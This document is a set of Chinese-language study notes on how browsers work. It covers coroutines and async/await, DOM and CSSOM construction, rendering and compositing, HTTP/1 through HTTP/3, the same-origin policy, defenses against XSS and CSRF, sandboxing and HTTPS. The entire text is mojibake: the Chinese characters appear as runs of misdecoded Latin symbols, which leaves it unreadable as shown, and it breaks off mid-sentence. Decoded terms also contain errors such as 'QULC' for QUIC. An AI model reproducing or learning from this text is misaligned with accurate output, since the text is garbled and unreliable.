ç”Ÿæˆå™¨å‡½æ•°æ˜¯ä¸€ä¸ªå¸¦æ˜Ÿå·å‡½æ•°ï¼Œè€Œä¸”æ˜¯å¯ä»¥æš‚åœæ‰§è¡Œå’Œå›žå¤æ‰§è¡Œçš„ï¼› ç”Ÿæˆå™¨å‡½æ•°å†…éƒ¨æ‰§è¡Œä¸€æ®µä»£ç ï¼Œé‡åˆ° yield å…³é”®å­—ï¼Œjavascript å¼•æ“Žè¿”å›žå…³é”®å­—åŽé¢çš„å†…å®¹ç»™å¤–éƒ¨ï¼Œå¹¶ä¸”æš‚åœè¯¥å‡½æ•°çš„æ‰§è¡Œï¼› å¤–éƒ¨å‡½æ•°å¯ä»¥åŒæ­¥ next æ–¹æ³•æ¢å¤å‡½æ•°çš„æ‰§è¡Œï¼› åç¨‹æ˜¯ä¸€ç§æ¯”çº¿ç¨‹æ›´åŠ è½»é‡çº§çš„å­˜åœ¨ï¼Œåç¨‹å¯ä»¥çœ‹æˆæ˜¯è·‘åœ¨çº¿ç¨‹ä¸Šçš„ä»»åŠ¡ï¼Œä¸€ä¸ªçº¿ç¨‹å¯ä»¥å­˜åœ¨å¤šä¸ªåç¨‹ï¼Œä½†æ˜¯åŒæ—¶åªèƒ½æ‰§è¡Œä¸€ä¸ªåç¨‹ï¼Œå¦‚æžœ A åç¨‹å¯åŠ¨ B åç¨‹ï¼ŒA ä¸º B çš„çˆ¶åç¨‹ï¼› åç¨‹ä¸è¢«æ“ä½œååŒå†…æ ¸æ‰€ç®¡ç†ï¼Œè€Œå®Œå…¨ç”±ç¨‹åºæ‰€æŽ§åˆ¶ï¼Œè¿™æ ·æ€§èƒ½æå‡ï¼› await xxx ä¼šåˆ›å»ºä¸€ä¸ª Promise å¯¹è±¡ï¼Œå°† xxx ä»»åŠ¡æäº¤ç»™å¾®ä»»åŠ¡é˜Ÿåˆ—ï¼› æš‚åœå½“å‰åç¨‹çš„æ‰§è¡Œï¼Œå°†ä¸»çº¿ç¨‹çš„æŽ§åˆ¶æƒåŠ›è½¬äº¤ç»™çˆ¶åç¨‹æ‰§è¡Œï¼ŒåŒæ—¶å°† Promise å¯¹è±¡è¿”å›žç»™çˆ¶åç¨‹ï¼Œç»§ç»­æ‰§è¡Œçˆ¶åç¨‹ï¼› çˆ¶åç¨‹æ‰§è¡Œç»“æŸä¹‹å‰ä¼šæ£€æŸ¥å¾®ä»»åŠ¡é˜Ÿåˆ—ï¼Œå¾®ä»»åŠ¡é˜Ÿåˆ—ä¸­æœ‰ resolve(xxx) ç­‰å¾…æ‰§è¡Œï¼Œè§¦å‘ then çš„å›žè°ƒå‡½æ•°ï¼› å›žè°ƒå‡½æ•°è¢«æ¿€æ´»åŽï¼Œä¼šå°†ä¸»çº¿ç¨‹çš„æŽ§åˆ¶æƒäº¤ç»™åç¨‹ï¼Œç»§ç»­æ‰§è¡ŒåŽç»­è¯­å¥ï¼Œå®ŒæˆåŽå°†æŽ§åˆ¶æƒè¿˜ç»™çˆ¶åç¨‹ã€‚ é¡µé¢æ€§èƒ½åˆ†æžï¼šåˆ©ç”¨ chrome åš web æ€§èƒ½åˆ†æž Chrome å¼€å‘è€…å·¥å…·ï¼ˆç®€ç§° DevToolsï¼‰æ˜¯ä¸€ç»„ç½‘é¡µåˆ¶ä½œå’Œè°ƒè¯•çš„å·¥å…·ï¼Œå†…åµŒäºŽ Google Chrome æµè§ˆå™¨ä¸­ã€‚å®ƒä¸€å…±åŒ…å«äº† 10 ä¸ªåŠŸèƒ½é¢æ¿ï¼ŒåŒ…æ‹¬äº† Elementsã€Consoleã€Sourcesã€NetWorkã€Performanceã€Memoryã€Applicationã€Securityã€Audits å’Œ Layersã€‚ DOM æ ‘ï¼šJavaScript æ˜¯å¦‚ä½•å½±å“ DOM æ ‘æž„å»ºçš„ HTML è§£æžå™¨ï¼ˆHTMLParseï¼‰è´Ÿè´£å°† HTML å­—èŠ‚æµè½¬æ¢ä¸º DOM ç»“æž„ï¼› HTML è§£æžå™¨å¹¶ä¸æ˜¯ç­‰æ•´ä¸ªæ–‡æ¡£åŠ è½½å®Œæˆä¹‹åŽå†è§£æžï¼Œè€Œæ˜¯ç½‘ç»œè¿›ç¨‹åŠ è½½æµå¤šå°‘æ•°æ®ï¼Œä¾¿è§£æžå¤šå°‘æ•°æ®ï¼› å­—èŠ‚æµè½¬æ¢æˆ DOM ä¸‰ä¸ªé˜¶æ®µï¼š1ã€å­—èŠ‚æµè½¬æ¢ä¸º Tokenï¼›2ã€ç»´æŠ¤ä¸€ä¸ª Token æ ˆï¼Œé‡åˆ° StartTag Token å…¥æ ˆï¼Œé‡åˆ° EndTag Token å‡ºæ ˆï¼›3ã€ä¸ºæ¯ä¸ª Token åˆ›å»ºä¸€ä¸ª DOM èŠ‚ç‚¹ï¼› JavaScript æ–‡ä»¶å’Œ CSS æ ·å¼è¡¨æ–‡ä»¶éƒ½ä¼šé˜»å¡ž DOM è§£æžï¼› æ¸²æŸ“æµæ°´çº¿ï¼šCSS å¦‚ä½•å½±å“é¦–æ¬¡åŠ è½½æ—¶çš„ç™½å±æ—¶é—´ï¼Ÿ DOM æž„å»ºç»“æŸä¹‹åŽï¼Œcss æ–‡ä»¶è¿˜æœªä¸‹è½½å®Œæˆï¼Œæ¸²æŸ“æµæ°´çº¿ç©ºé—²ï¼Œå› ä¸ºä¸‹ä¸€æ­¥æ˜¯åˆæˆå¸ƒå±€æ ‘ï¼Œåˆæˆå¸ƒå±€æ ‘éœ€è¦ CSSOM å’Œ DOMï¼Œè¿™é‡Œéœ€è¦ç­‰å¾… CSS åŠ è½½ç»“æŸå¹¶è§£æžæˆ CSSOMï¼› CSSOM ä¸¤ä¸ªä½œç”¨ï¼šæä¾›ç»™ JavaScript æ“ä½œæ ·å¼è¡¨èƒ½åŠ›ï¼Œä¸ºå¸ƒå±€æ ‘çš„åˆæˆæä¾›åŸºç¡€æ ·å¼ä¿¡æ¯ï¼› åœ¨æ‰§è¡Œ JavaScript è„šæœ¬ä¹‹å‰ï¼Œå¦‚æžœé¡µé¢ä¸­åŒ…å«äº†å¤–éƒ¨ CSS æ–‡ä»¶çš„å¼•ç”¨ï¼Œæˆ–è€…é€šè¿‡ style æ ‡ç­¾å†…ç½®äº† CSS å†…å®¹ï¼Œé‚£ä¹ˆæ¸²æŸ“å¼•æ“Žè¿˜éœ€è¦å°†è¿™äº›å†…å®¹è½¬åŒ–ä¸º CSSOMï¼Œå› ä¸º JavaScript æœ‰ä¿®æ”¹ CSSOM çš„èƒ½åŠ›ï¼Œæ‰€ä»¥åœ¨æ‰§è¡Œ JavaScript ä¹‹å‰ï¼Œè¿˜éœ€è¦ä¾èµ– CSSOMã€‚ä¹Ÿå°±æ˜¯è¯´ CSS åœ¨éƒ¨åˆ†æƒ…å†µä¸‹ä¹Ÿä¼šé˜»å¡ž DOM çš„ç”Ÿæˆã€‚ åˆ†å±‚å’Œåˆæˆæœºåˆ¶ï¼šä¸ºä»€ä¹ˆ CSS åŠ¨ç”»æ¯” JavaScript é«˜æ•ˆ æ˜¾ç¤ºå™¨å›ºå®šåˆ·æ–°é¢‘çŽ‡æ˜¯ 60HZï¼Œå³æ¯ç§’æ›´æ–° 60 å¼ å›¾ç‰‡ï¼Œå›¾ç‰‡æ¥è‡ªæ˜¾å¡çš„å‰ç¼“å†²åŒºï¼› æ˜¾å¡çš„èŒè´£æ˜¯åˆæˆæ–°çš„å›¾åƒï¼Œä¿å­˜åœ¨åŽç¼“å†²åŒºï¼Œç„¶åŽåŽç¼“å†²åŒºå’Œå‰ç¼“å†²åŒºäº’æ¢ï¼Œæ˜¾å¡æ›´æ–°é¢‘çŽ‡å’Œæ˜¾ç¤ºå‰åˆ·æ–°é¢‘çŽ‡ä¸ä¸€è‡´ï¼Œå°±ä¼šé€ æˆè§†è§‰ä¸Šçš„å¡é¡¿ï¼› æ¸²æŸ“æµæ°´çº¿ç”Ÿæˆçš„æ¯ä¸€å‰¯å›¾ç‰‡ç§°ä¸ºä¸€å¸§ï¼Œç”Ÿæˆä¸€å¸§çš„æ–¹å¼æœ‰é‡æŽ’ã€é‡ç»˜å’Œåˆæˆä¸‰ç§ï¼› é‡æŽ’ä¼šæ ¹æ® CSSOM å’Œ DOM è®¡ç®—å¸ƒå±€æ ‘ï¼Œé‡ç»˜æ²¡æœ‰é‡æ–°å¸ƒå±€é˜¶æ®µï¼› ç”Ÿæˆå¸ƒå±€æ ‘ä¹‹åŽï¼Œæ¸²æŸ“å¼•æ“Žæ ¹æ®å¸ƒå±€æ ‘ç‰¹ç‚¹è½¬åŒ–ä¸ºå±‚æ ‘ï¼Œæ¯ä¸€å±‚è§£æžå‡ºç»˜åˆ¶åˆ—è¡¨ï¼› æ …æ ¼çº¿ç¨‹æ ¹æ®ç»˜åˆ¶åˆ—è¡¨ä¸­çš„æŒ‡ä»¤ç”Ÿæˆå›¾ç‰‡ï¼Œæ¯ä¸€å±‚å¯¹åº”ä¸€å¼ å›¾ç‰‡ï¼Œåˆæˆçº¿ç¨‹å°†è¿™äº›å›¾ç‰‡åˆæˆä¸€å¼ å›¾ç‰‡ï¼Œå‘é€åˆ°åŽç¼“å­˜åŒºï¼› åˆæˆçº¿ç¨‹ä¼šå°†æ¯ä¸ªå›¾å±‚åˆ†å‰²æˆå¤§å°å›ºå®šçš„å›¾å—ï¼Œä¼˜å…ˆç»˜åˆ¶é è¿‘è§†å£çš„å›¾å—ï¼› é¡µé¢æ€§èƒ½ï¼šå¦‚ä½•ç³»ç»Ÿä¼˜åŒ–é¡µé¢ åŠ è½½é˜¶æ®µï¼šå‡å°‘å…³é”®èµ„æºä¸ªæ•°ï¼Œé™ä½Žå…³é”®èµ„æºå¤§å°ï¼Œé™ä½Žå…³é”®èµ„æºçš„ RTT æ¬¡æ•°ï¼› äº¤äº’é˜¶æ®µï¼šå‡å°‘ JavaScript è„šæœ¬æ‰§è¡Œæ—¶é—´ï¼Œé¿å…å¼ºåˆ¶åŒæ­¥å¸ƒå±€ï¼šæ“ä½œ DOM çš„åŒæ—¶èŽ·å–å¸ƒå±€æ ·å¼ä¼šå¼•å‘ï¼Œé¿å…å¸ƒå±€æŠ–åŠ¨ï¼šå¤šæ¬¡æ‰§è¡Œå¼ºåˆ¶å¸ƒå±€å’ŒæŠ–åŠ¨ï¼Œåˆç†åˆ©ç”¨ CSS åˆæˆåŠ¨ç”»ï¼šæ ‡è®° will-changeï¼Œé¿å…é¢‘ç¹çš„åžƒåœ¾å›žæ”¶ï¼› CSS å®žçŽ°ä¸€äº›å˜å½¢ã€æ¸å˜ã€åŠ¨ç”»ç­‰ç‰¹æ•ˆï¼Œè¿™æ˜¯ç”± CSS è§¦å‘çš„ï¼Œå¹¶ä¸”æ˜¯åœ¨åˆæˆçº¿ç¨‹ä¸­æ‰§è¡Œï¼Œè¿™ä¸ªè¿‡ç¨‹ç§°ä¸ºåˆæˆï¼Œå®ƒä¸ä¼šè§¦å‘é‡æŽ’æˆ–è€…é‡ç»˜ï¼› è™šæ‹Ÿ DOMï¼šè™šæ‹Ÿ DOM å’ŒçœŸå®ž DOM æœ‰ä½•ä¸åŒ å½“æœ‰æ•°æ®æ›´æ–°æ—¶ï¼Œ React ä¼šç”Ÿäº§ä¸€ä¸ªæ–°çš„è™šæ‹Ÿ DOMï¼Œç„¶ä¼šæ‹¿æ–°çš„è™šæ‹Ÿ DOM å’Œä¹‹å‰çš„è™šæ‹Ÿ DOM è¿›è¡Œæ¯”è¾ƒï¼Œè¿™ä¸ªè¿‡ç¨‹æ‰¾å‡ºå˜åŒ–çš„èŠ‚ç‚¹ï¼Œç„¶åŽå°†å˜åŒ–çš„èŠ‚ç‚¹åº”ç”¨åˆ° DOM ä¸Šï¼› æœ€å¼€å§‹çš„æ—¶å€™ï¼Œæ¯”è¾ƒä¸¤ä¸ª DOM çš„è¿‡ç¨‹æ˜¯åœ¨ä¸€ä¸ªé€’å½’å‡½æ•°é‡Œæ‰§è¡Œçš„ï¼Œå…¶æ ¸å¿ƒç®—æ³•æ˜¯ reconciliationã€‚é€šå¸¸æƒ…å†µï¼Œè¿™ä¸ªæ¯”è¾ƒè¿‡ç¨‹æ‰§è¡Œå¾ˆå¿«ï¼Œä¸è¿‡è™šæ‹Ÿ DOM æ¯”è¾ƒå¤æ‚æ—¶ï¼Œæ‰§è¡Œæ¯”è¾ƒå‡½æ•°å¯èƒ½å æ®ä¸»çº¿ç¨‹æ¯”è¾ƒä¹…çš„æ—¶é—´ï¼Œè¿™æ ·ä¼šå¯¼è‡´å…¶ä»–ä»»åŠ¡çš„ç­‰å¾…ï¼Œé€ æˆé¡µé¢å¡é¡¿ã€‚React å›¢é˜Ÿé‡å†™äº† reconciliation ç®—æ³•ï¼Œç§°ä¸º Fiber reconcilerï¼Œä¹‹å‰è€çš„ç®—æ³•ç§°ä¸º Stack reconcilerï¼› PWAï¼šè§£å†³ web åº”ç”¨å“ªäº›é—®é¢˜ PWAï¼ˆProgressive Web Appï¼‰ï¼Œæ¸è¿›å¼ Web åº”ç”¨ã€‚ä¸€ä¸ªæ¸è¿›å¼è¿‡æ¸¡æ–¹æ¡ˆï¼Œè®©æ™®é€šç«™ç‚¹è¿‡æ¸¡åˆ° Web åº”ç”¨ï¼Œé™ä½Žç«™ç‚¹æ”¹é€ ä»£ä»·ï¼Œé€æ¸æ”¯æŒæ–°æŠ€æœ¯ï¼Œè€Œä¸æ˜¯ä¸€æ­¥åˆ°ä½ï¼› PWA å¼•å…¥ ServiceWorker æ¥è¯•ç€è§£å†³ç¦»çº¿å­˜å‚¨å’Œæ¶ˆæ¯æŽ¨é€é—®é¢˜ï¼Œå¼•å…¥ mainfest.json æ¥è§£å†³ä¸€çº§å…¥å£é—®é¢˜ï¼› æš—è½¬äº† ServiceWorker æ¨¡å—ä¹‹åŽï¼ŒWebApp è¯·æ±‚èµ„æºæ—¶ï¼Œä¼šå…ˆé€šè¿‡ ServiceWorkerï¼Œè®©å®ƒåˆ¤æ–­æ˜¯è¿”å›ž Serviceworker ç¼“å­˜çš„èµ„æºè¿˜æ˜¯é‡æ–°åŽ»ç½‘ç»œè¯·æ±‚èµ„æºï¼Œä¸€åˆ‡çš„æŽ§åˆ¶æƒäº¤ç»™ ServiceWorker æ¥å¤„ç†ï¼› åœ¨ç›®å‰çš„ Chrome æž¶æž„ä¸­ï¼ŒService Worker æ˜¯è¿è¡Œåœ¨æµè§ˆå™¨è¿›ç¨‹ä¸­çš„ï¼Œå› ä¸ºæµè§ˆå™¨è¿›ç¨‹ç”Ÿå‘½å‘¨æœŸæ˜¯æœ€é•¿çš„ï¼Œæ‰€ä»¥åœ¨æµè§ˆå™¨çš„ç”Ÿå‘½å‘¨æœŸå†…ï¼Œèƒ½å¤Ÿä¸ºæ‰€æœ‰çš„é¡µé¢æä¾›æœåŠ¡ï¼› WebComponentï¼šåƒæ­ç§¯æœ¨ä¸€æ ·æž„å»º web åº”ç”¨ CSS çš„å…¨å±€å±žæ€§ä¼šé˜»ç¢ç»„ä»¶åŒ–ï¼ŒDOM ä¹Ÿæ˜¯é˜»ç¢ç»„ä»¶åŒ–çš„ä¸€ä¸ªå› ç´ ï¼Œå› ä¸ºé¡µé¢ä¸­åªæœ‰ä¸€ä¸ª DOMï¼Œä»»ä½•åœ°æ–¹éƒ½å¯ä»¥ç›´æŽ¥è¯»å–å’Œä¿®æ”¹ DOMï¼› WebComponent æä¾›äº†å¯¹å±€éƒ¨è¯•å›¾å°è£…èƒ½åŠ›ï¼Œå¯ä»¥è®© DOMã€CSSOM å’Œ JavaScript è¿è¡Œåœ¨å±€éƒ¨çŽ¯å¢ƒä¸­ï¼› template åˆ›å»ºæ¨¡ç‰ˆï¼ŒæŸ¥æ‰¾æ¨¡ç‰ˆå†…å®¹ï¼Œåˆ›å»ºå½±å­ DOMï¼Œæ¨¡ç‰ˆæ·»åŠ åˆ°å½±å­ DOM ä¸Šï¼› å½±å­ DOM å¯ä»¥éš”ç¦»å…¨å±€ CSS å’Œ DOMï¼Œä½†æ˜¯ JavaScript æ˜¯ä¸ä¼šè¢«éš”ç¦»çš„ï¼› HTTP1ï¼šHTTP1 æ€§èƒ½ä¼˜åŒ– HTTP/0.9 åŸºäºŽ TCP åè®®ï¼Œä¸‰æ¬¡æ¡æ‰‹å»ºç«‹è¿žæŽ¥ï¼Œå‘é€ä¸€ä¸ª GET è¯·æ±‚è¡Œï¼ˆæ²¡æœ‰è¯·æ±‚å¤´å’Œè¯·æ±‚ä½“ï¼‰ï¼ŒæœåŠ¡å™¨æŽ¥æ”¶è¯·æ±‚ä¹‹åŽï¼Œè¯»å–å¯¹åº” HTML æ–‡ä»¶ï¼Œæ•°æ®ä»¥ ASCII å­—ç¬¦æµè¿”å›žï¼Œä¼ è¾“å®Œæˆæ–­å¼€è¿žæŽ¥ï¼› HTTP/1.0 å¢žåŠ è¯·æ±‚å¤´å’Œå“åº”å¤´æ¥è¿›è¡Œåå•†ï¼Œåœ¨å‘èµ·è¯·æ±‚æ—¶é€šè¿‡è¯·æ±‚å¤´å‘Šè¯‰æœåŠ¡å™¨å®ƒæœŸå¾…è¿”å›žä»€ä¹ˆç±»åž‹é—®é¢˜ã€ä»€ä¹ˆå½¢å¼åŽ‹ç¼©ã€ä»€ä¹ˆè¯­è¨€ä»¥åŠæ–‡ä»¶ç¼–ç ã€‚å¼•å…¥æ¥çŠ¶æ€å—ï¼ŒCache æœºåˆ¶ç­‰ï¼› HTTP/1.1 æ”¹è¿›æŒä¹…åŒ–è¿žæŽ¥ï¼Œè§£å†³å»ºç«‹ TCP è¿žæŽ¥ã€ä¼ è¾“æ•°æ®å’Œæ–­å¼€è¿žæŽ¥å¸¦æ¥çš„å¤§é‡å¼€é”€ï¼Œæ”¯æŒåœ¨ä¸€ä¸ª TCP è¿žæŽ¥ä¸Šå¯ä»¥ä¼ è¾“å¤šä¸ª HTTP è¯·æ±‚ï¼Œç›®å‰æµè§ˆå™¨å¯¹äºŽä¸€ä¸ªåŸŸååŒæ—¶å…è®¸å»ºç«‹ 6 ä¸ª TCP æŒä¹…è¿žæŽ¥ï¼› HTTP/1.1 å¼•å…¥ Chunk transfer æ”¯æŒåŠ¨æ€ç”Ÿæˆå†…å®¹ï¼šæœåŠ¡å™¨å°†æ•°æ®åˆ†å‰²æˆè‹¥å¹²ä»»æ„å¤§å°çš„æ•°æ®å—ï¼Œæ¯ä¸ªæ•°æ®å—å‘é€æ—¶é™„ä¸Šä¸Šä¸ªæ•°æ®å—çš„é•¿åº¦ï¼Œæœ€åŽä½¿ç”¨ä¸€ä¸ªé›¶é•¿åº¦çš„å—ä½œä¸ºå‘é€æ•°æ®å®Œæˆçš„æ ‡å¿—ã€‚åœ¨ HTTP/1.1 éœ€è¦åœ¨å“åº”å¤´ä¸­è®¾ç½®å®Œæ•´çš„æ•°æ®å¤§å°ï¼Œå¦‚ Content-Lengthã€‚ HTTP2ï¼šå¦‚ä½•æå‡ç½‘ç»œé€Ÿåº¦ HTTP/1.1 ä¸»è¦é—®é¢˜ï¼šTCP æ…¢å¯åŠ¨ï¼›åŒæ—¶å¼€å¯å¤šæ¡ TCP è¿žæŽ¥ï¼Œä¼šç«žäº‰å›ºå®šå®½å¸¦ï¼›å¯¹å¤´é˜»å¡žé—®é¢˜ï¼› HTTP/2 åœ¨ä¸€ä¸ªåŸŸåä¸‹åªä½¿ç”¨ä¸€ä¸ª TCP é•¿è¿žæŽ¥å’Œæ¶ˆé™¤å¯¹å¤´é˜»å¡žé—®é¢˜ï¼› å¤šè·¯å¤ç”¨çš„å®žçŽ°ï¼šHTTP/2 æ·»åŠ äº†äºŒè¿›åˆ¶åˆ†å¸§å±‚ï¼Œå°†å‘é€æˆ–å“åº”æ•°æ®ç»è¿‡äºŒè¿›åˆ¶åˆ†å¸§å¤„ç†ï¼Œè½¬åŒ–ä¸ºä¸€ä¸ªä¸ªå¸¦æœ‰è¯·æ±‚ ID ç¼–å·çš„å¸§ï¼ŒæœåŠ¡å™¨æˆ–è€…æµè§ˆå™¨æŽ¥æ”¶åˆ°å“åº”å¸§åŽï¼Œæ ¹æ®ç›¸åŒ ID å¸§åˆå¹¶ä¸ºä¸€æ¡å®Œæ•´ä¿¡æ¯ï¼› è®¾ç½®è¯·æ±‚ä¼˜å…ˆçº§ï¼šå‘é€è¯·æ±‚å¯ä»¥è®¾ç½®è¯·æ±‚ä¼˜å…ˆçº§ï¼ŒæœåŠ¡å™¨å¯ä»¥ä¼˜å…ˆå¤„ç†ï¼› æœåŠ¡å™¨æŽ¨é€ï¼šè¯·æ±‚ä¸€ä¸ª HTML é¡µé¢ï¼ŒæœåŠ¡å™¨å¯ä»¥çŸ¥é“å¼•ç”¨äº†å“ªäº› JavaScript å’Œ CSS æ–‡ä»¶ï¼Œé™„å¸¦ä¸€èµ·å‘é€ç»™æµè§ˆå™¨ï¼› å¤´éƒ¨åŽ‹ç¼©ï¼šå¯¹è¯·æ±‚å¤´å’Œå“åº”å¤´è¿›è¡ŒåŽ‹ç¼©ï¼› HTTP3ï¼šç”©æŽ‰ TCPã€TCL åŒ…è¢±ï¼Œæž„å»ºé«˜æ•ˆç½‘ç»œ è™½ç„¶ HTTP/2 è§£å†³äº†åº”ç”¨å±‚é¢çš„å¯¹å¤´é˜»å¡žé—®é¢˜ï¼Œä¸è¿‡å’Œ HTTP/1.1 ä¸€æ ·ï¼ŒHTTP/2 ä¾ç„¶æ˜¯åŸºäºŽ TCP åè®®ï¼Œè€Œ TCP æœ€åˆæ˜¯ä¸ºäº†å•è¿žæŽ¥è€Œè®¾è®¡ï¼› TCP å¯ä»¥çœ‹æˆæ˜¯è®¡ç®—æœºä¹‹é—´çš„ä¸€ä¸ªè™šæ‹Ÿç®¡é“ï¼Œæ•°æ®ä»Žä¸€ç«¯å‘é€åˆ°å¦ä¸€ç«¯ä¼šè¢«æ‹†åˆ†ä¸ºä¸€ä¸ªä¸ªæŒ‰ç…§é¡ºåºæŽ’åˆ—çš„æ•°æ®åŒ…ï¼Œå¦‚æžœåœ¨ä¼ è¾“è¿‡ç¨‹ä¸­ï¼Œæœ‰ä¸€ä¸ªæ•°æ®å› ä¸ºç½‘ç»œæ•…éšœæˆ–è€…å…¶ä»–åŽŸå› ä¸¢å¤±ï¼Œé‚£ä¹ˆæ•´ä¸ªè¿žæŽ¥ä¼šå¤„äºŽæš‚åœçŠ¶æ€ï¼Œåªæœ‰ç­‰åˆ°è¯¥æ•°æ®é‡æ–°ä¼ è¾“ï¼› ç”±äºŽ TCP åè®®åƒµåŒ–ï¼Œä¹Ÿä¸å¯èƒ½ä½¿ç”¨æ–°çš„åè®®ï¼ŒHTTP/3 é€‰æ‹©äº†ä¸€ä¸ªæŠ˜è¡·çš„æ–¹æ³•ï¼ŒåŸºäºŽçŽ°æœ‰çš„ UDP åè®®ï¼Œå®žçŽ°ç±»ä¼¼ TC ç‰‡å¤šè·¯å¤ç”¨ï¼Œä¼ è¾“å¯é ç­‰åŠŸèƒ½ï¼Œç§°ä¸º QULC åè®®ï¼› QULC å®žçŽ°ç±»ä¼¼ TCP æµé‡æŽ§åˆ¶ï¼Œä¼ è¾“å¯é åŠŸèƒ½ï¼›é›†æˆ TLS åŠ å¯†åŠŸèƒ½ï¼›å®žçŽ°å¤šè·¯å¤ç”¨åŠŸèƒ½ï¼› åŒæºç­–ç•¥ï¼šä¸ºä»€ä¹ˆ XMLHttpRequst ä¸èƒ½è·¨åŸŸè¯·æ±‚ åè®®ã€åŸŸåå’Œç«¯å£å·ç›¸åŒçš„ URL æ˜¯åŒæºçš„ï¼› åŒæºç­–ç•¥ä¼šéš”ç¦»ä¸åŒæºçš„ DOMã€é¡µé¢æ•°æ®å’Œç½‘ç»œé€šä¿¡ï¼› é¡µé¢å¯ä»¥å¼•ç”¨ç¬¬ä¸‰æ–¹èµ„æºï¼Œä¸è¿‡æš´éœ²å‡ºè¯¸å¦‚ XSS é—®é¢˜ï¼Œå¼•å…¥å†…å®¹å®‰å…¨ç­–ç•¥ CSP é™åˆ¶ï¼› é»˜è®¤ XMLHttpRequest å’Œ Fetch ä¸èƒ½è·¨ç«™è¯·æ±‚èµ„æºï¼Œå¼•å…¥è·¨åŸŸèµ„æºå…±äº«ï¼ˆCORSï¼‰è¿›è¡Œè·¨åŸŸè®¿é—®æŽ§åˆ¶ï¼› è·¨ç«™è„šæœ¬æ”»å‡» XSSï¼šä¸ºä»€ä¹ˆ cookie ä¸­æœ‰ httpOnly å±žæ€§ XSS è·¨ç«™è„šæœ¬ï¼Œå¾€ HTML æ–‡ä»¶ä¸­æ³¨å…¥æ¶æ„ä»£ç ï¼Œå¯¹ç”¨æˆ·å®žæ–½æ”»å‡»ï¼› XSS æ”»å‡»ä¸»è¦æœ‰å­˜å‚¨åž‹ XSS æ”»å‡»ã€åå°„åž‹ XSS æ”»å‡»å’Œ DOM çš„ XSS æ”»å‡»ï¼› é˜»æ­¢ XSS æ”»å‡»ï¼šæœåŠ¡å™¨å¯¹è„šæœ¬è¿›è¡Œè¿‡æ»¤æˆ–è½¬ç ï¼Œåˆ©ç”¨ CSP ç­–ç•¥ï¼Œä½¿ç”¨ HttpOnlyï¼› CSRF æ”»å‡»ï¼šé™Œç”Ÿè¿žæŽ¥ä¸è¦éšä¾¿ç‚¹ CSRF è·¨ç«™è¯·æ±‚ä¼ªé€ ï¼Œåˆ©ç”¨ç”¨æˆ·çš„ç™»å½•çŠ¶æ€ï¼Œé€šè¿‡ç¬¬ä¸‰æ–¹ç«™ç‚¹æ”»å‡»ï¼› é¿å… CSRF æ”»å‡»ï¼šåˆ©ç”¨ SameSiteï¼ˆä¸‰ç§æ¨¡å¼ï¼šStrictã€Laxã€Noneï¼‰ è®©æµè§ˆå™¨ç¦æ­¢ç¬¬ä¸‰æ–¹ç«™ç‚¹å‘èµ·è¯·æ±‚æºå¸¦å…³é”® Cookieï¼›éªŒè¯è¯·æ±‚çš„æ¥æºç«™ç‚¹ï¼Œè¯·æ±‚å¤´ä¸­çš„ Referer å’Œ Origin å±žæ€§ï¼›åˆ©ç”¨ CSRF Tokenï¼› æ²™ç›’ï¼šé¡µé¢å’Œç³»ç»Ÿä¹‹é—´çš„éš”ç¦»å¢™ æµè§ˆå™¨è¢«åˆ’åˆ†ä¸ºæµè§ˆå™¨å†…æ ¸å’Œæ¸²æŸ“å†…æ ¸ä¸¤ä¸ªæ ¸å¿ƒæ¨¡å—ï¼Œå…¶ä¸­æµè§ˆå™¨å†…æ ¸æ˜¯ç”±ç½‘ç»œè¿›ç¨‹ã€æµè§ˆå™¨ä¸»è¿›ç¨‹å’Œ GPU è¿›ç¨‹ç»„æˆçš„ï¼Œæ¸²æŸ“å†…æ ¸å°±æ˜¯æ¸²æŸ“è¿›ç¨‹ï¼› æµè§ˆå™¨ä¸­çš„å®‰å…¨æ²™ç®±æ˜¯åˆ©ç”¨æ“ä½œç³»ç»Ÿæä¾›çš„å®‰å…¨æŠ€æœ¯ï¼Œè®©æ¸²æŸ“è¿›ç¨‹åœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­æ— æ³•è®¿é—®æˆ–è€…ä¿®æ”¹æ“ä½œç³»ç»Ÿä¸­çš„æ•°æ®ï¼Œåœ¨æ¸²æŸ“è¿›ç¨‹éœ€è¦è®¿é—®ç³»ç»Ÿèµ„æºçš„æ—¶å€™ï¼Œéœ€è¦é€šè¿‡æµè§ˆå™¨å†…æ ¸æ¥å®žçŽ°ï¼Œç„¶åŽå°†è®¿é—®çš„ç»“æžœé€šè¿‡ IPC è½¬å‘ç»™æ¸²æŸ“è¿›ç¨‹ï¼› ç«™ç‚¹éš”ç¦»ï¼ˆSite Isolationï¼‰å°†åŒä¸€ç«™ç‚¹ï¼ˆåŒ…å«ç›¸åŒæ ¹åŸŸåå’Œç›¸åŒåè®®çš„åœ°å€ï¼‰ä¸­ç›¸äº’å…³è”çš„é¡µé¢æ”¾åˆ°åŒä¸€ä¸ªæ¸²æŸ“è¿›ç¨‹ä¸­æ‰§è¡Œï¼› å®žçŽ°ç«™ç‚¹éš”ç¦»ï¼Œå°±å¯ä»¥å°†æ¶æ„çš„ iframe éš”ç¦»åœ¨æ¶æ„è¿›ç¨‹å†…éƒ¨ï¼Œä½¿å¾—å®ƒæ— æ³•ç»§ç»­è®¿é—®å…¶ä»– iframe è¿›ç¨‹çš„å†…å®¹ï¼Œå› æ­¤æ— æ³•æ”»å‡»å…¶ä»–ç«™ç‚¹ï¼› HTTPSï¼šè®©æ•°æ®ä¼ è¾“æ›´å®‰å…¨ åœ¨ TCP å’Œ HTTP ä¹‹é—´æ’å…¥ä¸€ä¸ªå®‰å…¨å±‚ï¼Œæ‰€æœ‰ç»è¿‡å®‰å…¨å±‚çš„æ•°æ®éƒ½ä¼šè¢«åŠ å¯†æˆ–è€…è§£å¯†ï¼› å¯¹ç§°åŠ å¯†ï¼šæµè§ˆå™¨å‘é€åŠ å¯†å¥—ä»¶åˆ—è¡¨å’Œä¸€ä¸ªéšæœºæ•° client-randomï¼ŒæœåŠ¡å™¨ä¼šä»ŽåŠ å¯†å¥—ä»¶ä¸­é€‰å–ä¸€ä¸ªåŠ å¯†å¥—ä»¶ï¼Œç„¶åŽç”Ÿæˆä¸€ä¸ªéšæœºæ•° service-randomï¼Œè¿”å›žç»™æµè§ˆå™¨ã€‚è¿™æ ·æµè§ˆå™¨å’ŒæœåŠ¡å™¨éƒ½æœ‰ç›¸åŒ client-random å’Œ service-randomï¼Œå†ç”¨ç›¸åŒçš„æ–¹æ³•å°†ä¸¤è€…æ··åˆç”Ÿæˆä¸€ä¸ªå¯†é’¥ master 